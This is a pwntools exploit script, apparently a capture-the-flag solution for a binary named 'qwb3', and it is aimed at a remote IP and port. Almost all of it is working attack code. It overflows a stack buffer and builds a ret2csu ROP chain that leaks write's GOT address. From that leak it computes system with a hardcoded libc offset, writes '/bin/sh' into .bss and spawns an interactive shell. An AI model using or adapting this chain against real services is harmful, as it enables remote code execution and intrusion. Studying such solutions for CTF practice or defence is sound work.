from pwn import *
# context(log_level="debug")
elf = ELF('qwb3')
write_plt = elf.symbols["write"]
read_plt  = elf.symbols["read"]
write_got = elf.got["write"]
read_got =elf.got["read"]
rop_addr  = 0x40062A
system_got =0x601010
main = 0x40059d
# gdb.attach(p,"b*0x40059C\nc")
# p = process('./qwb3')
p = remote('106.75.8.230',19286)
# p = remote('127.0.0.1',10001)
p.recvuntil('\n')
bss = 0x601038
def leak(addr):
	payload = '\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(addr)+p64(1)+p64(0x400610)+7*8*'\x00'+p64(main)
	p.send(payload)
	sleep(1)
	data =  p.recv(8)
	p.recvuntil('\n')
	print "%#x => %s" % (addr, (data or '').encode('hex'))
	return data
# d = DynELF(leak, elf=ELF('./qwb3'))
# system_addr = d.lookup('execve', 'libc')
# print hex(u64(leak(write_got)))
system_addr = u64(leak(write_got)) - (0x7f7d4bb06510- 0x7f7d4bad7da0)
# system_addr = u64(leak(write_got)) - (0x7fac9451d4d0- 0x7fac944f1040)
print "system_addr=" + hex(system_addr)
### send '/bin/sh'
# gdb.attach(p,"b*0x40059C\nc")
payload2 = '\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(read_got)+p64(16)+p64(bss)+p64(0)+p64(0x400610)+7*8*'\x00'+p64(main)
p.send(payload2)
sleep(1)
p.send('/bin/sh\0'+p64(system_addr))

p.recvuntil('\n')
###  call system

payload4 = '\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(bss+8)+p64(0)+p64(0)+p64(bss)+p64(0x400610)+7*8*'\x00'+p64(main)
p.send(payload4)
p.interactive()

###ps：发包一定要在一个包里发完。。不然。。。